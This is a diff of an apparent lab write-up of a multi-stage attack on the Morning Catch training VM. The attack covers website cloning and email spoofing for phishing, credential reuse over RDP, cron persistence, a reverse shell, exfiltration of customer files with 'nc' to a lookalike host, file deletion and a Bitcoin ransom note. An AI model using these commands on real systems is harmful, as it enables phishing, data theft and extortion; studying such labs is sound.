@@ -39,15 +39,7 @@ On the Victim VM:
 
 #### SMTP
 
-In the `/etc/mail/access` of the Morning Catch VM, by default some lines are commented security reasons, so I needed to modify it and reload the SMTP server. 
-
-```bash
-sudo nano /etc/mail/access
-sudo makemap hash /etc/mail/access < /etc/mail/access
-sudo service sendmail reload
-```
-
-To make the phishing attack work, I had to give `RELAY` rights to the private subnet, by whitelisting these lines in `/etc/mail/access`:
+To make the phishing attack work, I had to give `RELAY` rights to the private subnet (and therefore to the attacker machine), by whitelisting these lines in `/etc/mail/access`:
 
 ```
 Connect: 192.168	  RELAY
@@ -61,7 +53,7 @@ ClientConn: 192.168	0
 * `nmap`: to discover the network
 * `wget`: to clone login website
 * `apache2`: to host the fake website
-* `telnet`: to send the fake email
+* `telnet`: to craft and send the fake email
 * `rdesktop`: to connect to the RDP service
 * `cron`: for persistence
 * `nc`: for the remote shell and for stealing the files
@@ -104,7 +96,7 @@ The idea for realizing the first phase is to clone the entire website and create
 
 #### 1.2. Cloning
 
-The attacker firstly clones the Morning Catch page for realism, using `wget`. 
+The attacker firstly clones the entire Morning Catch website, using `wget`. 
 
 ```bash
 wget -r -k -p morningcatch.ph
@@ -113,7 +105,7 @@ sudo mv morningcatch.ph/* /var/www/html
 
 This command downloads all the web resources of the company website, making the dependencies local.
 
-The attacker then clones the web login page to access mail of Morning Catch. This will allow for the `mail` directory to be created, so the url will be more similar to the original one. 
+The attacker then clones the web login page to access mail of Morning Catch. This will allow for the `mail` directory to be created, so the url of the login form will be more similar to the original one. 
 
 ```bash
 wget -r -k -p morningcatch/mail/
@@ -196,13 +188,17 @@ Boyd
 quit
 ```
 
+This sequence of SMTP commands crafts and sends an email from the system administrator of the company to the CEO, redirecting him to the fake login page (hosted on the attacker's machine). 
+
+This spoofing step is possible due to the vulnerable Sendmail server, configured to allow unauthenticated relaying from internal network addresses.
+
 ###### Richard POV
 
 Richard Bourn checks his email and receives the message (from the real Boyd Jenius!):
 
 <img src="images/mail.png" alt="Screenshot 2025-06-06 alle 18.43.04 " style="zoom:50%;" />
 
-Then Richard enters the username and password, that we can find in the `creds.txt` file.
+Then Richard enters the username and password, that we can find in the `creds.txt` file. Threat escalated!
 
 <img src="images/cred.png" alt="Screenshot 2025-06-08 alle 17.12.42 " style="zoom:50%;" />
 
@@ -212,15 +208,15 @@ Then Richard enters the username and password, that we can find in the `creds.tx
 
 #### 2.1. Exploring Richard's Machine
 
-Now that the attacker has the CEO's credentials, they can try to reuse them (Credential Stuffing) for accessing other services. In particular the `ms-wbt-server`, which is the service name used by the Remote Desktop Protocol (RDP).
+Now that the attacker has the CEO's credentials, they can try to reuse them (Credential Stuffing) for accessing other services. In particular the `ms-wbt-server` (identified earlier with `nmap`), which is the service name used by the Remote Desktop Protocol (RDP).
 
 Firstly the attacker authenticates as Richard Bourne:
 
 ```bash
-rdesktop -u rbourne -p password <Victim IP>
+rdesktop -u rbourne -p password morningcatch.ph
 ```
 
-The credentials are valid and he's inside the CEO's desktop environment.
+The `morningcatch.ph` name on the attacker machine resolves the victim's IP. The credentials are valid and he's inside the CEO's desktop environment.
 
 <img src="images/rdp.png" alt="Screenshot 2025-06-07 alle 09.10.12 " style="zoom:50%;" />
 
@@ -248,6 +244,7 @@ eval "$SAFETYCOM"
 * this command is both saved in the crontab and executed at the end of the script;
 * the errors of the crontab are ignored to avoid leaving any obvious traces;
 * cronjob is executed at every reboot of the system, after waiting 200 seconds (for giving the system time to set up propely).
+* the cronjob will be executed with the privileges of the user that executes `innocent.sh`
 
 On the attacker machine:
 
@@ -291,13 +288,13 @@ On the terminal of the victim, through the reverse shell:
 cat /home/rbourne/Documents/customers.csv | nc mornincatch.ph 1234
 ```
 
-The attacker does the same with `company_picnic.csv`. 
+The `mornincatch.ph` name on the victim machine resolves the attacker's IP. The attacker does the same with `company_picnic.csv`. 
 
 Then lastly on the victim machine:
 
 ```bash
 rm -r Documents/*
-echo "Pay or your internal files will be made public." > Documents/README.txt
+echo "ATTENTION: we have your sensitive data (SSN, credit card). The originals were deleted. Pay 5.0 BTC to bc1adfka3flasjdlks2mdl0asmd. YOU HAVE 72 HOURS." > Documents/README.txt
 ```
 
 So the attacker successfully exfiltrated the sensitive data and deleted the original files from the victim's system, leaving a ransom note behind. The attack is completed!
